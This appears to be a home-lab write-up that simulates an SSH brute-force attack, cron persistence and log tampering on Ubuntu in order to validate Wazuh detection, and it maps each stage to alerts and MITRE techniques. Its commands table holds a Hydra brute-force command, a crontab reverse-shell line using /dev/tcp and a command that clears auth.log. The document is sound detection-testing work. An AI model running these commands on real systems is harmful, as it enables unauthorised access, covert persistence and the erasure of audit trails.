# Scenario 04 — Linux SSH Brute Force + Persistence

## Objective
Simulate a multi-stage Linux attack involving SSH brute force, successful authentication,
cron job persistence, and log tampering. Analyze detection capability across Wazuh and
Linux native logging sources.

---

## Attack Stages
| Stage | Activity |
|---|---|
| 1 | SSH Brute Force via Hydra |
| 2 | Successful SSH Login |
| 3 | Cron Job Persistence |
| 4 | Log Tampering |

---

## Environment
| Component | Description |
|---|---|
| SIEM | Wazuh |
| Attacker | Kali Linux (Live USB) |
| Victim | Ubuntu Server + Wazuh Agent |
| Log Sources | auth.log, syslog, Wazuh FIM |

---

## MITRE ATT&CK Coverage
| Technique | ID |
|---|---|
| Brute Force: Password Guessing | T1110.001 |
| Valid Accounts | T1078 |
| Scheduled Task/Job: Cron | T1053.003 |
| Indicator Removal: Clear Linux Logs | T1070.003 |

---

## Commands
| Stage | Command |
|---|---|
| 1 | `hydra -l ubuntu -P ~/passwords.txt ssh://<target-ip> -t 4 -V` |
| 2 | `ssh ubuntu@<target-ip>` |
| 3 | `(crontab -l 2>/dev/null; echo "@reboot /bin/bash -i >& /dev/tcp/127.0.0.1/4444 0>&1") \| crontab -` |
| 4 | `sudo sh -c "cat /dev/null > /var/log/auth.log"` |

---

## Detection Evidence
| Stage | Log File | Query | Rule |
|---|---|---|---|
| 1 | scenario04_bruteforce.json | `rule.groups: authentication_failed` | 5763 |
| 2 | scenario04_ssh_login.json | `rule.groups: authentication_success` | 5715 |
| 3 | scenario04_persistence.json | `syscheck.path: *crontab*` | Custom 100401 |
| 4 | scenario04_logtamper.json | `syscheck.path: *auth.log*` | Custom 100402 |

---

## Attack Timeline
| Time | Stage | Activity | Detected |
|---|---|---|---|
| T+0 | 1 | Hydra brute force against SSH | ✅ |
| T+1 | 2 | Successful SSH login from Kali | ✅ |
| T+2 | 3 | Malicious cron job added | ✅ |
| T+3 | 4 | auth.log cleared | ✅ |

---

## Investigation Goals
1. Detect brute force activity from source IP
2. Correlate failed logins with successful authentication
3. Identify persistence via cron job modification
4. Detect log tampering via FIM alerts
5. Build full attack timeline from telemetry

---

## Outcome
The attack successfully generated:
- Multiple failed SSH authentication alerts
- Successful login event following brute force
- FIM alert on crontab modification
- FIM alert on auth.log tampering

This validates:
- Wazuh auth.log ingestion
- File Integrity Monitoring configuration
- SSH brute force detection
- Linux persistence detection

---

## References
- [T1110.001](https://attack.mitre.org/techniques/T1110/001/)
- [T1078](https://attack.mitre.org/techniques/T1078/)
- [T1053.003](https://attack.mitre.org/techniques/T1053/003/)
- [T1070.003](https://attack.mitre.org/techniques/T1070/003/)
